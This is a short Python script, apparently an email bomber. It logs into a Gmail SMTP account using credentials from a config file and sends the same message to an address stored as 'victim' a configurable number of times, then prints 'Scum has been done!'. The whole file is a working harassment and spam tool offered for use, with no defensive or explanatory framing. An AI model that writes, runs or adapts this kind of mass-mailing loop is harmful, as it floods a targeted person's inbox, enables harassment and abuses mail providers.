import smtplib
import config
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

msg = MIMEMultipart()

msg['From'] = config.login
msg['To'] = config.victim
msg['Subject'] = config.subject

msg.attach(MIMEText(config.message, config.mstype))

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(config.login, config.password)

for i in range(config.amount):
	server.sendmail(msg['From'], msg['To'], msg.as_string())
 
server.quit()

print('Scum has been done!')